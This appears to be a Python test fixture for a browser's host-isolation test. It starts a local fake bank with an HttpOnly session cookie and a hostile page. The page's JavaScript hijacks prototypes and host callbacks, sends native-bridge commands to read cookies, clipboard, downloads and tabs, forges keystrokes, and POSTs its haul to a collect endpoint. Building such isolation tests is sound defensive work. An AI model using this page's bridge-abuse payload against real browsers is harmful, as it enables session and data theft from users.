"""A hostile page and the 'bank' it targets, for the host-isolation test (stdlib only).
  bank   http://127.0.0.1:8772  /login sets an HttpOnly session cookie, /secret answers only with it; every request is recorded in HITS.
  evil   http://localhost:8773  a page that tries every way to reach the host from inside the page's own JavaScript world and
         POSTs what it got to /collect (kept in COLLECTED).
start() -> (BANK, EVIL) base URLs."""
import http.server, json, socketserver, threading

BANK = 'http://127.0.0.1:8772'
EVIL = 'http://localhost:8773'
HITS = []            # (path, user-agent, had-cookie) for every request the bank received
COLLECTED = []       # what the hostile page says it obtained

EVIL_PAGE = b"""<!doctype html><title>evil</title><p>hostile page</p><script>
var got = [], log = [];
function keep(x) { try { got.push(typeof x === 'string' ? x : JSON.stringify(x)); } catch (e) {} }
var oJ = JSON.stringify;
try { var o1 = window.__brainCb; window.__brainCb = function (o) { keep(o); if (o1) o1(o); }; } catch (e) {}
var sealed = false;
try { var o2 = window.__brainPush; window.__brainPush = function (o) { keep(o); return o2 && o2(o); }; sealed = (window.__brainPush === o2); } catch (e) { sealed = true; }
['forEach', 'map', 'filter', 'slice', 'concat', 'find'].forEach(function (k) { var o = Array.prototype[k]; Array.prototype[k] = function () { try { if (this.length && this[0] && typeof this[0] === 'object' && ('u' in this[0] || 'url' in this[0])) keep({sniffed: k, items: this}); } catch (e) {} return o.apply(this, arguments); }; });
var oA = Array.isArray; Array.isArray = function (x) { try { if (x && x.length && x[0] && (x[0].u || x[0].url || x[0].t)) keep({isArray: x}); } catch (e) {} return oA.call(Array, x); };
var oK = Object.keys; Object.keys = function (x) { try { if (x && (x.hist || x.bmarks)) keep({keys: x}); } catch (e) {} return oK.apply(this, arguments); };
var cmds = ['brain:dtsend:' + JSON.stringify({m: 'GET', u: 'http://127.0.0.1:8772/secret'}), 'brain:dtcookies', 'brain:dtsessions', 'brain:clipread',
            'brain:dllist', 'brain:tabs', 'brain:newtab:http://127.0.0.1:8772/forged'];
try { cmds.forEach(function (c) { window.external.sendMessage(c); }); } catch (e) { log.push('external: ' + e); }
try { cmds.forEach(function (c) { window.webkit.messageHandlers.brain.postMessage(c); }); } catch (e) { log.push('native: ' + e); }
try { var f = document.createElement('iframe'); document.body.appendChild(f); cmds.forEach(function (c) { f.contentWindow.webkit.messageHandlers.brain.postMessage(c); }); } catch (e) { log.push('iframe: ' + e); }
// synthetic input aimed at the toolbar script's own handlers (a page can fake events; only real input is the user's)
try { ['keydown', 'keyup'].forEach(function (t) { window.dispatchEvent(new KeyboardEvent(t, {key: 't', code: 'KeyT', ctrlKey: true, bubbles: true})); }); } catch (e) {}
setTimeout(function () { fetch('/collect', {method: 'POST', body: oJ({got: got, log: log, sealed: sealed, cap: typeof window.__brainCap})}); }, 3500);
</script>"""


class _Bank(http.server.BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    def log_message(self, *a): pass
    def do_GET(self):
        ck = self.headers.get('Cookie') or ''
        HITS.append((self.path, self.headers.get('User-Agent') or '', 'session=SECRET-TOKEN-123' in ck))
        if self.path == '/login':
            body = b'logged in'; code = 200; extra = {'Set-Cookie': 'session=SECRET-TOKEN-123; Path=/; HttpOnly'}
        elif self.path == '/secret':
            ok = 'session=SECRET-TOKEN-123' in ck
            body = b'ACCOUNT BALANCE: 1,000,000' if ok else b'403 not logged in'; code = 200 if ok else 403; extra = {}
        else: body = b'bank'; code = 200; extra = {}
        self.send_response(code); self.send_header('Content-Type', 'text/html'); self.send_header('Content-Length', str(len(body)))
        for k, v in extra.items(): self.send_header(k, v)
        self.end_headers(); self.wfile.write(body)


class _Evil(http.server.BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    def log_message(self, *a): pass
    def do_GET(self):
        self.send_response(200); self.send_header('Content-Type', 'text/html'); self.send_header('Content-Length', str(len(EVIL_PAGE))); self.end_headers(); self.wfile.write(EVIL_PAGE)
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0)); COLLECTED.append(json.loads(self.rfile.read(n) or b'{}'))
        self.send_response(200); self.send_header('Content-Length', '2'); self.end_headers(); self.wfile.write(b'ok')


class _T(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def start():
    for port, h in ((8772, _Bank), (8773, _Evil)):
        threading.Thread(target=_T(('127.0.0.1', port), h).serve_forever, daemon=True).start()
    return BANK, EVIL
